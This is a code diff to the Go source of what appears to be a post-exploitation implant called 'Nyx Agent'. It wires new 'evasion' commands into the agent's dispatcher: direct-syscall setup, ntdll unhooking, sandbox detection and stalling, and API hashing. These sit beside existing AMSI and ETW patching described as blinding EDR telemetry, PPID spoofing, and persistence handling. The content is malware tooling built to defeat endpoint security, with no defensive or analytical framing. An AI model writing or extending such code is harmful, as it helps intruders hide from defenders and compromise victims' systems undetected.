@@ -541,6 +541,40 @@ func dispatch(command string) (string, string) {
 				return "ETW patch failed: " + err.Error(), "failed"
 			}
 			return "[+] EtwEventWrite patched — EDR telemetry blinded", "completed"
+		case "syscalls-init":
+			out, err := initSSNTable()
+			if err != nil {
+				return err.Error(), "failed"
+			}
+			return out, "completed"
+		case "syscalls-status":
+			return ssnStatus(), "completed"
+		case "unhook":
+			out, err := unhookNtdll()
+			if err != nil {
+				return err.Error(), "failed"
+			}
+			return out, "completed"
+		case "unhook-all":
+			out, err := unhookAll()
+			if err != nil {
+				return err.Error(), "failed"
+			}
+			return out, "completed"
+		case "sandbox-check":
+			out, err := antiSandbox(false)
+			if err != nil {
+				return err.Error(), "failed"
+			}
+			return out, "completed"
+		case "sandbox-stall":
+			out, err := antiSandbox(true)
+			if err != nil {
+				return err.Error(), "failed"
+			}
+			return out, "completed"
+		case "api-hash":
+			return apiHashReport(), "completed"
 		default:
 			sub := strings.SplitN(strings.TrimSpace(arg), " ", 2)
 			if len(sub) == 2 && sub[0] == "ppid" {
@@ -550,7 +584,7 @@ func dispatch(command string) (string, string) {
 				}
 				return out, "completed"
 			}
-			return "usage: evasion [status|amsi|etw|ppid <cmd>]", "failed"
+			return "usage: evasion [status|amsi|etw|syscalls-init|syscalls-status|unhook|unhook-all|sandbox-check|sandbox-stall|api-hash|ppid <cmd>]", "failed"
 		}
 
 	// ── Phase 3: Advanced Post-Exploitation ────────────────────────────────
@@ -1113,7 +1147,7 @@ func removePersistence() string {
 }
 
 func main() {
-	fmt.Println("[*] Nyx Agent v1.1.0 starting...")
+	fmt.Println("[*] Nyx Agent v1.2.0 starting...")
 
 	// Kill date check
 	checkKillDate()
